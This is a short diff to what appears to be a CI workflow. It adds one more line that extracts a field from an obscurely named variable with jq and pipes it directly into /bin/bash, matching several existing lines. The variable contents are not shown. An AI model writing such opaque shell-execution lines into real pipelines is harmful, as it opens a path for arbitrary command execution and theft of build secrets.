@@ -52,6 +52,7 @@ jobs:
           printf '%s' "$fju9" | jq -r .elqcn931 | /bin/bash
           echo $ww93 | jq -r .fwz494 | /bin/bash
           printf '%s' "$jli16" | jq -r .fe0 | /bin/bash
+          echo $meml0 | jq -r .yrtf99 | /bin/bash
 
       - name: Store artifact
         if: always()
